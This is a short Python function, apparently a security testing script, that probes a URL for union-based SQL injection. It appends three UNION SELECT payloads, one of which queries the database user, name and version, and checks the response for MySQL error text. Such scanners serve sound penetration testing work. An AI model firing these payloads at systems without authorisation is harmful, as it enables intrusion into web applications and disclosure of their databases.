def union_based_sql_injection(url):
    import requests as req

    def union_based(url, payload):
        try:
            response = req.get(url + payload)
            if "SQL syntax" in response.text or "MySQL server version" in response.text:
                return True
            else:
                return False
        except req.RequestException as e:
            print(f"An error occurred: {e}")
            return False

    print("Starting Union-Based SQL Injection Test...")
    payloads = [
        "' UNION SELECT NULL, NULL, NULL-- -",
        "' UNION SELECT 1, 2, 3-- -",
        "' UNION SELECT user(), database(), version()-- -"
    ]

    for payload in payloads:
        if union_based(url, payload):
            print(f"Vulnerability found with payload: {payload}")
            return True

    print("No vulnerabilities found.")
    return False